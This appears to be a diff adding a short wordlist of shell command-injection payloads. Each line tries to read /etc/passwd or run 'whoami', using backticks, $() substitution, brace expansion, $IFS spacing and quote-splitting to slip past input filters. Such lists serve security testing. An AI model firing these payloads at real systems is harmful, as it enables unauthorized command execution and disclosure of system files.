@@ -1,0 +1,11 @@
+`cat /etc/passwd`
+$(cat /etc/passwd)
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+IFS=,;`cat<<<uname,-a`
+w'h'o'am'i
+w"h"o"am"i
+w\ho\am\i
+who$@ami
+echo whoami|$0
+
